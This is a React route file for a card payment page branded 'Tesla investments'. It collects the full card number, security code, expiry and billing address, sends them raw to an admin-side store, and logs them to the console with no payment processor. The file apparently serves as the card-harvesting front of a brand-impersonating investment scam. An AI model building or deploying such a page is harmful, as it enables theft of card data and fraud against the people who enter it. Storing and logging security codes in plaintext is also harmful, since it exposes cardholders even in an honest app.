import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { savePaymentSubmission } from "@/lib/admin.functions";
import PaymentForm from "@/components/PaymentForm";

const cardLogos = [
  { name: "Visa", color: "#1a1f71", accent: "#feda4a" },
  { name: "Mastercard", color: "#eb001b", accent: "#f79e1b" },
  { name: "Amex", color: "#0066b3", accent: "" },
  { name: "Discover", color: "#f87f26", accent: "" },
] as const;

function CardLogo({ name, color, accent }: { name: string; color: string; accent: string }) {
  const isTwoTone = Boolean(accent);
  return (
    <div
      className="flex items-center gap-1 rounded-lg border border-gray-200 bg-white px-3 py-1.5 shadow-sm"
      title={name}
    >
      <svg
        className="w-5 h-5"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        strokeWidth="2"
      >
        <rect width="20" height="14" x="2" y="5" rx="2" />
      </svg>
      <div
        className={`flex h-6 w-6 items-center justify-center rounded-md text-white text-[10px] font-bold uppercase ${isTwoTone ? "bg-gradient-to-r from-[#1a1f71] to-[#feda4a]" : "bg-[#0066b3]"}`}
      >
        {name === "Visa"
          ? "VISA"
          : name === "Mastercard"
            ? "MC"
            : name === "Amex"
              ? "AMEX"
              : "DISC"}
      </div>
    </div>
  );
}

export const Route = createFileRoute("/_authenticated/pay")({
  head: () => ({
    meta: [
      { title: "Pay with card — Tesla investments" },
      {
        name: "description",
        content: "Enter your card details to complete your Tesla investment payment.",
      },
      { property: "og:title", content: "Pay with card — Tesla investments" },
      {
        property: "og:description",
        content: "Pay for your Tesla investment with a debit or credit card.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: PayPage,
});

function PayPage() {
  const navigate = useNavigate();
  const [open, setOpen] = useState(true);

  async function handlePay(details: {
    cardName: string;
    cardNumber: string;
    expiry: string;
    securityCode: string;
    street: string;
    city: string;
    state: string;
    zip: string;
    saveCard: boolean;
  }) {
    await savePaymentSubmission({ data: details });
    console.log("Card payment submitted:", details);
    setOpen(false);
    navigate({ to: "/payment-success" });
  }

  return (
    <main className="min-h-[100svh] w-full bg-white text-gray-900 font-sans px-6 pb-20">
      <div className="mx-auto max-w-[35%] px-6 pt-8 pb-12">
        <p className="text-xs uppercase tracking-widest text-gray-400 mb-6">Accepted cards</p>
        <div className="flex flex-wrap gap-4 justify-center mb-10">
          {cardLogos.map((logo) => (
            <CardLogo key={logo.name} {...logo} />
          ))}
        </div>
        {open && <PaymentForm onPay={handlePay} />}
      </div>
    </main>
  );
}
